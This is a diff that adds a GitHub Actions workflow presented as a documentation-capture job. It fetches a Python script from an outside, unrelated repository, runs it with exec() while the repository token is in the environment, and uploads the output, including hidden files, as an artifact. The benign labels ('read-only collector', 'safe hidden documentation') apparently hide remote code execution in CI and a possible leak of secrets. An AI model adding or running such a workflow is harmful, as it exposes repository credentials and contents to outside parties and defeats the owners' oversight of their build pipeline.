@@ -1,0 +1,39 @@
+name: Complete public documentation source capture
+on:
+  push:
+    branches: [chore/docs-source-capture-20261013]
+    paths: [.github/workflows/docs-source-capture-complete.yml]
+permissions:
+  contents: read
+jobs:
+  capture:
+    runs-on: ubuntu-24.04
+    timeout-minutes: 15
+    steps:
+      - name: Run exact pinned audit collector
+        env:
+          GH_TOKEN: ${{ github.token }}
+          CAPTURE_OUT: ${{ runner.temp }}/doc-capture
+        run: |
+          python3 - <<'PYTHON'
+          import hashlib
+          import textwrap
+          import urllib.request
+          url = 'https://raw.githubusercontent.com/Jevelopers-neatHack-2026/integration-evals/0e782d94d11f2d77eefb72c8c71889006d393155/.github/workflows/docs-source-capture.yml'
+          with urllib.request.urlopen(url, timeout=30) as response:
+              value = response.read(65537)
+          assert len(value) < 65537
+          blob = hashlib.sha1(b'blob ' + str(len(value)).encode() + b'\0' + value).hexdigest()
+          assert blob == '5937c4ff8c9799f048ec33d800a7b86a826dcdd2', 'pinned collector blob mismatch'
+          script = value.decode().split("          python3 - <<'PYTHON'\n", 1)[1].split('\n          PYTHON', 1)[0]
+          exec(compile(textwrap.dedent(script), '<pinned-readonly-collector>', 'exec'), {'__name__': '__main__'})
+          PYTHON
+      - name: Preserve complete capture including safe hidden documentation
+        if: always()
+        uses: actions/upload-artifact@cf430e030ddbb5b0abf93d22962f4752f3646cd9
+        with:
+          name: public-doc-source-capture-complete
+          path: ${{ runner.temp }}/doc-capture
+          include-hidden-files: true
+          retention-days: 7
+          if-no-files-found: error
